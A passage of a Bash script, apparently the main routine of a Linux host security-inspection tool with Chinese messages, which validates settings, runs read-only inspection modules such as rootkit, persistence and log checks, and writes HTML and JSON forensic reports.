        [[ "$YARA_MAX_FILES" =~ ^[0-9]+$ ]] || { log_error 'SECSCOPE_YARA_MAX_FILES 必须是整数'; return 2; }
    else
        [[ "$YARA_MAX_FILES" =~ ^[0-9]+$ ]] && [ "$YARA_MAX_FILES" -ge 1 ] && [ "$YARA_MAX_FILES" -le 1000000 ] || { log_error 'SECSCOPE_YARA_MAX_FILES 必须是 1-1000000 的整数'; return 2; }
    fi
    [[ "$YARA_MAX_RULE_SOURCES" =~ ^[0-9]+$ ]] && [ "$YARA_MAX_RULE_SOURCES" -ge 1 ] && [ "$YARA_MAX_RULE_SOURCES" -le 4096 ] || { log_error 'SECSCOPE_YARA_MAX_RULE_SOURCES 必须是 1-4096 的整数'; return 2; }
    [[ "$YARA_RULE_MAX_DEPTH" =~ ^[0-9]+$ ]] && [ "$YARA_RULE_MAX_DEPTH" -ge 1 ] && [ "$YARA_RULE_MAX_DEPTH" -le 20 ] || { log_error 'SECSCOPE_YARA_RULE_MAX_DEPTH 必须是 1-20 的整数'; return 2; }
    for numeric in "$RETENTION_DAYS" "$HIGH_RETENTION_DAYS"; do
        [[ "$numeric" =~ ^-1$|^[0-9]+$ ]] || { log_error '保留天数必须是 -1（永久）或非负整数'; return 2; }
    done
    [[ "$RESOLVE_AFTER_MISSES" =~ ^[0-9]+$ ]] || { log_error '消警轮数必须是正整数'; return 2; }
    [ "$RESOLVE_AFTER_MISSES" -ge 1 ] || { log_error 'SECSCOPE_RESOLVE_AFTER_MISSES 必须大于 0'; return 2; }

    if [ "$(id -u)" -ne 0 ]; then
        log_error '本脚本需要 root 权限执行全面只读检查'
        return 1
    fi

    acquire_run_lock
    lock_rc=$?
    if [ "$lock_rc" -ne 0 ]; then
        [ "$lock_rc" -eq 2 ] && [ "$SCHEDULED_RUN" = true ] && return 0
        return 3
    fi

    case "$SCAN_PROFILE" in fast-hunt) report_profile_dir=fast ;; daily-hunt) report_profile_dir=daily ;; full) report_profile_dir=full ;; corpus-validation) report_profile_dir=corpus-validation ;; esac
    if [ "$OUTPUT_DIR_EXPLICIT" = false ]; then REPORT_ROOT="${REPORT_ROOT%/}/${report_profile_dir}"; fi
    [ -L "$REPORT_ROOT" ] && { log_error "拒绝使用符号链接报告根目录: $REPORT_ROOT"; return 1; }
    if ! mkdir -p "$REPORT_ROOT" || ! chmod 700 "$REPORT_ROOT"; then
        log_error "无法初始化报告根目录: $REPORT_ROOT"
        return 1
    fi
    REPORT_ROOT=$(cd "$REPORT_ROOT" && pwd -P) || return 1
    : > "$REPORT_ROOT/.secscope-report-root" || return 1
    chmod 600 "$REPORT_ROOT/.secscope-report-root"

    if [ -n "$OUTPUT_DIR" ]; then OUTPUT_DIR_EXPLICIT=true; fi
    safe_host=$(printf '%s' "$HOSTNAME" | LC_ALL=C tr -c 'A-Za-z0-9._-' '_')
    [ -n "$OUTPUT_DIR" ] || OUTPUT_DIR="${REPORT_ROOT}/${TIMESTAMP}_${safe_host}_$$"
    [ -L "$OUTPUT_DIR" ] && { log_error "拒绝使用符号链接作为输出目录: $OUTPUT_DIR"; return 1; }
    if [ -d "$OUTPUT_DIR" ] && [ -n "$(find "$OUTPUT_DIR" -mindepth 1 -maxdepth 1 -print -quit 2>/dev/null)" ]; then
        log_error "输出目录非空，拒绝覆盖既有证据: $OUTPUT_DIR"
        return 1
    fi
    mkdir -p "$OUTPUT_DIR" || { log_error "无法创建输出目录: $OUTPUT_DIR"; return 1; }
    OUTPUT_DIR=$(cd "$OUTPUT_DIR" && pwd -P) || return 1
    RAW_DIR="$OUTPUT_DIR/raw"
    mkdir -p "$RAW_DIR" && chmod 700 "$OUTPUT_DIR" "$RAW_DIR" || return 1
    printf '%s\n' '警告：raw 为完整取证证据，可能包含账户、IP、环境变量、命令行凭据、密码或 Token。请限制访问和传输；对外分享请使用 --share-package 并人工复核。' > "${RAW_DIR}/SENSITIVE-DATA-WARNING.txt"
    chmod 600 "${RAW_DIR}/SENSITIVE-DATA-WARNING.txt"
    record_raw_status 'SENSITIVE-DATA-WARNING.txt' SUCCESS bootstrap ''
    HTML_FILE="${OUTPUT_DIR}/report_${safe_host}_${TIMESTAMP}.html"
    benchmark_init || return $?
    native_scanner_preflight || return $?

    HOST_ID=$(cat /etc/machine-id 2>/dev/null | tr -d '\n\r')
    [ -n "$HOST_ID" ] || HOST_ID=$(sha256_text "${HOSTNAME}|$(uname -m 2>/dev/null)")
    if [ "$STATE_ENABLED" = true ]; then
        [ -L "$STATE_DIR" ] && { log_error "拒绝使用符号链接状态目录: $STATE_DIR"; return 1; }
        if ! prepare_state_store; then
            state_failed=1
            if [ "$INIT_STATE" = true ] || [ "$RESET_STATE" = true ]; then return 1; fi
            STATE_ENABLED=false
            STATE_HEALTH="FAILED"
            log_warn '状态存储不可用，本轮继续全量检查但不执行跨轮消警'
        fi
    else
        STATE_HEALTH="DISABLED"
    fi

    load_external_whitelists
    detect_os
    detect_host_role
    maintenance_window_active && MAINTENANCE_ACTIVE=true || MAINTENANCE_ACTIVE=false
    print_banner
    panel_init
    MODULE_COMPLETED=0
    progress_bar 0 "$MODULE_TOTAL" '准备中' WAITING '正在初始化检查'
    CURRENT_MODULE=system
    verify_self_integrity
    CURRENT_MODULE=bootstrap

    profile_module_enabled system      && run_module system      '系统信息'       check_system_info
    profile_module_enabled users       && run_module users       '用户与认证'     check_users_auth
    profile_module_enabled process     && run_module process     '进程检查'       check_process
    profile_module_enabled network     && run_module network     '网络连接'       check_network
    profile_module_enabled rootkit     && run_module rootkit     '内核与 Rootkit' check_rootkit
    profile_module_enabled persistence && run_module persistence '持久化机制'     check_persistence
    profile_module_enabled filesystem  && run_module filesystem  '文件系统'       check_filesystem
    profile_module_enabled history     && run_module history     '历史与环境'     check_history_env
    profile_module_enabled services    && run_module services    '服务与供应链'   check_services
    profile_module_enabled logs        && run_module logs        '日志分析'       check_logs
    profile_module_enabled memory      && run_module memory      '内存轻量取证'   check_memory
    profile_module_enabled baseline    && run_module baseline    '配置基线'       check_baseline
    CURRENT_MODULE=yara
    benchmark_stage_begin yara_promotion
    promote_yara_findings
    benchmark_stage_end yara_promotion
    write_suppression_audit || mark_current_module_partial suppression_audit_failed
    calculate_coverage
    progress_bar "$MODULE_COMPLETED" "$MODULE_TOTAL" '结果汇总' RUNNING '正在对账状态并生成报告'

    benchmark_stage_begin state_reconcile
    if ! reconcile_state; then
        state_failed=1
        STATE_HEALTH="FAILED"
        for idx in "${!FINDINGS[@]}"; do FINDING_LIFECYCLES[$idx]="UNTRACKED"; done
        log_warn '状态对账失败，本轮报告仍会生成'
    fi
    benchmark_stage_end state_reconcile
    recalculate_severity_counts
    benchmark_stage_begin report_html
    generate_report || report_failed=1
    benchmark_stage_end report_html
    benchmark_stage_begin report_json
    if [ "$report_failed" -eq 0 ]; then
        write_findings_json || { log_warn 'findings.json 写入失败'; report_failed=1; }
    fi
    if [ "$report_failed" -eq 0 ]; then
        write_status_json "$(verdict_text)" || { log_warn 'status.json 写入失败，拒绝提交文件增量基线'; report_failed=1; }
    fi
    benchmark_stage_end report_json
    apply_retention
    update_report_archive_index || log_warn '历史报告索引更新失败，单轮报告仍可用'
    [ "$report_failed" -ne 0 ] || enforce_offline_network_policy
    final_verdict=$(verdict_text)
    PANEL_VERDICT="$final_verdict"
    PANEL_PHASE=COMPLETE
    PANEL_CURRENT_NAME='全部检查完成'
    PANEL_CURRENT_STATUS=$([ "$report_failed" -eq 0 ] && printf SUCCESS || printf FAILED)
    PANEL_CURRENT_DETAIL=$([ "$report_failed" -eq 0 ] && printf '巡检与报告生成完成' || printf '报告生成失败')
    panel_write_state
    panel_finish

    if [ "$report_failed" -eq 0 ]; then
        benchmark_stage_begin evidence_finalize
        finalize_evidence || report_failed=1
        benchmark_stage_end evidence_finalize
    fi
    if [ "$report_failed" -eq 0 ]; then
        benchmark_stage_begin state_commit
        commit_alert_state || { log_warn '告警生命周期状态提交失败，已保留上一份有效状态'; state_failed=1; }
        commit_process_resource_baseline || { log_warn '进程资源基线提交失败'; state_failed=1; }
        commit_beacon_history || { log_warn 'Beacon 历史提交失败'; state_failed=1; }
        commit_connection_baseline || { log_warn '连接基线提交失败'; state_failed=1; }
        commit_web_runtime_baseline || { log_warn 'Web 运行时基线提交失败'; state_failed=1; }
        save_file_inventory_state || { log_warn '文件增量状态提交失败，已保留上一份有效基线'; state_failed=1; }
        [ "$SHARE_PACKAGE" = false ] || create_share_package || report_failed=1
        benchmark_stage_end state_commit
    fi

    benchmark_write_summary || true

    [ "$state_failed" -eq 0 ] || log_warn '本轮完整检查已完成，但记忆系统处于降级状态'
    log_info "最终结论: ${final_verdict}"
    log_info "检查覆盖率: ${RUN_COVERAGE}%"
    log_info "报告目录: ${OUTPUT_DIR}"
    [ "$report_failed" -eq 0 ] || return 1
    return 0
}

# 直接执行时运行；被测试脚本 source 时只加载函数。
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    main "$@"
fi
